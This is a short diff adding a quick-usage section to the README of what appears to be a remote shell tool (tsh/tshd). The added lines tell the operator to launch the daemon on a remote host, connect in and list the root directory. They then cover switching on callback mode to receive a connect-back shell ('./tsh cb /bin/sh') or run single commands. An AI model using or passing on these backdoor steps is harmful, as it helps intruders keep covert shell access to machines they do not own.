@@ -71,3 +71,11 @@
         However, you may choose not to store the real (valid) key in
         the client, which will then ask for a password when it starts.
 
+    * Qucik Paste 
+        Comment out callback host and callback delay for server to bind 
+        ./tshd <-- launch on remote host 
+        ./tsh 127.0.0.1 'ls -lartF /' <-- connect in 
+        Uncomment callback host and callback delay to get cb 
+        ./tshd <-- launch on remote host 
+        ./tsh cb id <-- run single cmd
+        ./tsh cb /bin/sh <-- get shell 
